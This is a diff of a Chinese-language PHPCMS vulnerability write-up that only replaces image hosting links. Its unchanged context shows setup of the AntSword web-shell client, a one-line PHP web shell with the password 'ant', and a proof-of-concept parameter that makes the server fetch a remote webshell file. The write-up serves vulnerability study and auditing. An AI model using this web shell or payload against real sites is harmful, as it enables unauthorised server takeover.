@@ -10,7 +10,7 @@
 # 安装：
 
 phpcms安装：  
-![](https://ws4.sinaimg.cn/large/006tKfTcgy1fi8vtqr4f8j30vg0p0whv.jpg)
+![](https://raw.githubusercontent.com/jerrychan807/imggg/master/006tKfTcgy1fi8vtqr4f8j30vg0p0whv.jpg)
 
 中国蚁剑安装：
 
@@ -19,7 +19,7 @@ phpcms安装：
 
 [https://github.com/antoor/antSword/releases](https://github.com/antoor/antSword/releases)  
 下载  
-![](https://ws1.sinaimg.cn/large/006tKfTcgy1fi8wt526wdj317e0bsgmu.jpg)
+![](https://raw.githubusercontent.com/jerrychan807/imggg/master/006tKfTcgy1fi8wt526wdj317e0bsgmu.jpg)
 
 解压，挂代理然后安装  
 `$ cd antSword  
@@ -28,7 +28,7 @@ $ npm install`
 在对应目录下启动：  
 `npm start`
 
-![](https://ws2.sinaimg.cn/large/006tKfTcgy1fi8wv9s2nfj31cs0r2tb1.jpg)
+![](https://raw.githubusercontent.com/jerrychan807/imggg/master/006tKfTcgy1fi8wv9s2nfj31cs0r2tb1.jpg)
 
 美滋滋~mac环境下终于不用再开虚拟机用中国菜刀.exe了 。
 
@@ -40,16 +40,16 @@ $ npm install`
 
 然后就会报错并返回shell地址：
 
-![](https://ws4.sinaimg.cn/large/006tKfTcgy1fi8vyz1051j31kw0fvdmx.jpg)
+![](https://raw.githubusercontent.com/jerrychan807/imggg/master/006tKfTcgy1fi8vyz1051j31kw0fvdmx.jpg)
 
 看看shell的密码:  
 `<?php $ant=base64_decode("YXNzZXJ0");$ant($_POST['ant']);?>`
 
 配置中国蚁剑：  
-![](https://ws4.sinaimg.cn/large/006tKfTcgy1fi8xafur45j30oe0j8400.jpg)  
+![](https://raw.githubusercontent.com/jerrychan807/imggg/master/006tKfTcgy1fi8xafur45j30oe0j8400.jpg)  
 密码为ant
 
-![](https://ws3.sinaimg.cn/large/006tKfTcgy1fi8x9qtnk3j31kw0jv42q.jpg)
+![](https://raw.githubusercontent.com/jerrychan807/imggg/master/006tKfTcgy1fi8x9qtnk3j31kw0jv42q.jpg)
 
 # 漏洞分析：
 
@@ -71,7 +71,7 @@ $ npm install`
 
 正常请求中info参数和poc中的参数好像有些不同
 
-![](https://ws3.sinaimg.cn/large/006tKfTcgy1fi8zbde0cwj31kw0f0ago.jpg)
+![](https://raw.githubusercontent.com/jerrychan807/imggg/master/006tKfTcgy1fi8zbde0cwj31kw0f0ago.jpg)
 
 正常请求:`info[Birthday]`  
 poc的：`info[content]=<img src=http://files.hackersb.cn/webshell/antSword-shells/php_assert.php#.jpg>`
@@ -220,7 +220,7 @@ function get($data) {
 
 ### download（）函数：
 
-![](https://ws2.sinaimg.cn/large/006tKfTcgy1fi92wk3icuj31kw0ujar9.jpg)
+![](https://raw.githubusercontent.com/jerrychan807/imggg/master/006tKfTcgy1fi92wk3icuj31kw0ujar9.jpg)
 
 # 漏洞修复：
 
@@ -232,5 +232,5 @@ function get($data) {
 
 # 审计思路：
 
-![](https://ws4.sinaimg.cn/large/006tKfTcgy1fi93f2nfmxj30n40zin3i.jpg)
+![](https://raw.githubusercontent.com/jerrychan807/imggg/master/006tKfTcgy1fi93f2nfmxj30n40zin3i.jpg)
 
